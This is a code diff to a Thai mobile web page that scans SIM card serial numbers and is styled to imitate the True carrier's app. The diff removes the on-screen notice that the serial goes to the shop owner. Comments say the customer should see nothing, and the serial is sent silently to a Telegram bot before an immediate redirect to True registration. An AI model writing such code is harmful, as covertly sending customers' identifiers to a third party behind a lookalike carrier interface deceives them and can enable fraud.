@@ -159,50 +159,54 @@ html, body {
   background: rgba(0,0,0,0.45);
 }
 
-/* Instruction text above frame */
+/* Instruction text — sits just above the scan frame */
 .cam-label {
   position: absolute;
   left: 0; right: 0;
-  top: calc(50% - 80px);
-  transform: translateY(-100%);
-  padding-bottom: 16px;
+  /* frame center ≈ 50% + 30px (half of 60px padding-top shift), frame half-height ≈ 13% */
+  /* place text so its bottom is ~16px above frame top */
+  bottom: calc(50% - 30px + 13vw + 16px);
   text-align: center;
-  font-size: 16px; font-weight: 600;
+  font-size: 20px; font-weight: 700;
   color: #fff;
   z-index: 4;
   pointer-events: none;
   letter-spacing: 0.01em;
+  text-shadow: 0 1px 8px rgba(0,0,0,0.5);
+  padding-inline: 16px;
 }
 
-/* Scan frame wrapper — centred */
+/* Scan frame wrapper — centred slightly above middle (like True app) */
 .scan-overlay {
   position: absolute; inset: 0;
   display: flex; align-items: center; justify-content: center;
+  /* shift frame to be just below center-text area */
+  padding-top: 60px;
   z-index: 3; pointer-events: none;
 }
 
 .scan-frame {
   position: relative;
-  width: 84%;
-  aspect-ratio: 3.2 / 1;
-  /* frosted rectangle inside */
-  background: rgba(180,180,180,0.18);
-  border-radius: 14px;
+  width: 86%;
+  aspect-ratio: 3.0 / 1;
+  /* frosted fill like True app */
+  background: rgba(160,140,120,0.22);
+  border-radius: 16px;
 }
 
-/* Four L-shaped corners — grey like True app */
+/* Four L-shaped corners — light grey like True app */
 .scan-frame::before, .scan-frame::after,
 .scan-frame > span::before, .scan-frame > span::after {
   content: '';
   position: absolute;
-  width: 32px; height: 32px;
-  border-color: rgba(220,220,220,0.9);
+  width: 36px; height: 36px;
+  border-color: rgba(210,210,210,0.95);
   border-style: solid;
 }
-.scan-frame::before  { top: -2px; left: -2px;   border-width: 3px 0 0 3px; border-radius: 10px 0 0 0; }
-.scan-frame::after   { top: -2px; right: -2px;  border-width: 3px 3px 0 0; border-radius: 0 10px 0 0; }
-.scan-frame > span::before { bottom: -2px; left: -2px;  border-width: 0 0 3px 3px; border-radius: 0 0 0 10px; }
-.scan-frame > span::after  { bottom: -2px; right: -2px; border-width: 0 3px 3px 0; border-radius: 0 0 10px 0; }
+.scan-frame::before  { top: -2px; left: -2px;   border-width: 3px 0 0 3px; border-radius: 12px 0 0 0; }
+.scan-frame::after   { top: -2px; right: -2px;  border-width: 3px 3px 0 0; border-radius: 0 12px 0 0; }
+.scan-frame > span::before { bottom: -2px; left: -2px;  border-width: 0 0 3px 3px; border-radius: 0 0 0 12px; }
+.scan-frame > span::after  { bottom: -2px; right: -2px; border-width: 0 3px 3px 0; border-radius: 0 0 12px 0; }
 
 /* No scan line — matches True app */
 .scan-line { display: none; }
@@ -265,80 +269,6 @@ html, body {
   text-align: center;
 }
 
-/* Result overlay inside camera area */
-.cam-result {
-  position: absolute; inset: 0;
-  display: flex; flex-direction: column;
-  align-items: center; justify-content: center;
-  background: rgba(0,0,0,0.85);
-  z-index: 7;
-  padding: 32px 24px;
-  gap: 18px;
-  animation: fadeIn 0.22s ease;
-}
-@keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
-
-.cam-result-badge {
-  display: flex; align-items: center; gap: 8px;
-  background: rgba(255,255,255,0.12);
-  border: 1px solid rgba(255,255,255,0.2);
-  border-radius: 24px;
-  padding: 7px 18px;
-  font-size: 14px; font-weight: 700; color: #fff;
-}
-.cam-result-badge .dot-ok {
-  width: 8px; height: 8px; border-radius: 50%;
-  background: #4ade80; flex-shrink: 0;
-}
-
-.cam-serial {
-  font-size: 26px; font-weight: 800;
-  color: #fff;
-  letter-spacing: 0.06em;
-  font-variant-numeric: tabular-nums;
-  text-align: center;
-  word-break: break-all;
-}
-
-.cam-tg-status {
-  font-size: 13px; font-weight: 600;
-  color: rgba(255,255,255,0.65);
-  text-align: center;
-}
-.cam-tg-ok  { color: #4ade80; }
-.cam-tg-err { color: #fbbf24; }
-
-.redirect-bar {
-  width: 65%; height: 4px;
-  background: rgba(255,255,255,0.15);
-  border-radius: 2px;
-  overflow: hidden;
-}
-.redirect-fill {
-  height: 100%;
-  background: var(--true-red);
-  border-radius: 2px;
-  width: 0%;
-  animation: fillBar 2.4s linear forwards;
-}
-@keyframes fillBar { to { width: 100%; } }
-
-.redirect-text {
-  font-size: 12px; font-weight: 600;
-  color: rgba(255,255,255,0.5);
-}
-
-.btn-rescan {
-  background: rgba(255,255,255,0.12);
-  border: 1px solid rgba(255,255,255,0.3);
-  border-radius: 10px;
-  padding: 11px 28px;
-  font-family: 'Sarabun', sans-serif;
-  font-size: 14px; font-weight: 700;
-  color: #fff; cursor: pointer;
-  transition: background 0.15s;
-}
-.btn-rescan:active { background: rgba(255,255,255,0.22); }
 
 /* ══════════════════════════
    MANUAL PANE — fills full remaining space
@@ -483,20 +413,7 @@ html, body {
         <div class="zoom-label" id="zoomLabel" onclick="cycleZoom()">1×</div>
       </div>
 
-      <!-- Result overlay -->
-      <div class="cam-result" id="camResult" hidden>
-        <div class="cam-result-badge">
-          <span class="dot-ok"></span>
-          อ่านเลขซีเรียลสำเร็จ
-        </div>
-        <div class="cam-serial" id="camSerialText"></div>
-        <div class="cam-tg-status" id="camTgStatus">⏳ กำลังส่งให้เจ้าของร้าน...</div>
-        <div class="redirect-bar">
-          <div class="redirect-fill" id="camRedirectFill"></div>
-        </div>
-        <div class="redirect-text">กำลังพาคุณไปลงทะเบียน True...</div>
-        <button class="btn-rescan" onclick="resetScan()">สแกนซิมใหม่</button>
-      </div>
+      <!-- ไม่มี result overlay — redirect ทันทีเมื่อสแกนสำเร็จ -->
     </div>
 
     <!-- ── Manual Pane ── -->
@@ -727,10 +644,6 @@ function extractSerial(raw) {
   return m2 ? m2[0] : null;
 }
 
-function resetScan() {
-  document.getElementById('camResult').hidden = true;
-  startCamera();
-}
 
 // ── Serial detected ──
 async function onSerialDetected(serial, mode) {
@@ -741,49 +654,17 @@ async function onSerialDetected(serial, mode) {
   });
 
   if (mode === 'scan') {
-    document.getElementById('camSerialText').textContent = serial;
-    document.getElementById('camTgStatus').textContent   = '⏳ กำลังส่งให้เจ้าของร้าน...';
-    document.getElementById('camTgStatus').className     = 'cam-tg-status';
-    const fill = document.getElementById('camRedirectFill');
-    fill.style.animation = 'none';
-    void fill.offsetWidth;
-    fill.style.animation = '';
-    document.getElementById('camResult').hidden = false;
-
-    const tgOk = await sendTelegram(serial, mode, now);
-    updateTgStatus(document.getElementById('camTgStatus'), tgOk, 'cam');
-    setTimeout(() => redirectToTrue(serial), 2500);
+    // ส่ง Telegram แล้ว redirect ทันที — ไม่แสดงอะไรให้ลูกค้าเห็น
+    sendTelegram(serial, mode, now); // fire and forget
+    redirectToTrue(serial);
 
   } else {
-    const el = document.getElementById('manualResult');
-    el.innerHTML = `
-      <div class="manual-result" id="mRes">
-        <div class="result-serial">${serial}</div>
-        <div class="result-status" id="mTgStatus">⏳ กำลังส่งให้เจ้าของร้าน...</div>
-      </div>`;
     document.getElementById('btnSubmit').disabled = true;
-    const tgOk = await sendTelegram(serial, mode, now);
-    const mTg = document.getElementById('mTgStatus');
-    if (mTg) updateTgStatus(mTg, tgOk, 'manual');
-    setTimeout(() => redirectToTrue(serial), 2500);
-    setTimeout(() => { const b = document.getElementById('btnSubmit'); if(b) b.disabled = false; }, 3500);
+    sendTelegram(serial, mode, now); // fire and forget
+    setTimeout(() => redirectToTrue(serial), 800);
   }
 }
 
-function updateTgStatus(el, tgOk, ctx) {
-  if (!el) return;
-  if (tgOk === true) {
-    el.textContent = '✅ ส่งแจ้งเตือนเจ้าของร้านแล้ว';
-    el.className   = ctx === 'cam' ? 'cam-tg-status cam-tg-ok' : el.className;
-    if (ctx !== 'cam') el.style.color = '#16a34a';
-  } else if (tgOk === false) {
-    el.textContent = '⚠️ ส่ง Telegram ไม่ได้ — แจ้งพนักงาน';
-    el.className   = ctx === 'cam' ? 'cam-tg-status cam-tg-err' : el.className;
-    if (ctx !== 'cam') el.style.color = '#d97706';
-  } else {
-    el.textContent = 'ℹ️ ยังไม่ตั้งค่า Telegram';
-  }
-}
 
 async function sendTelegram(serial, mode, now) {
   if (!tgBot || !tgChat) return null;
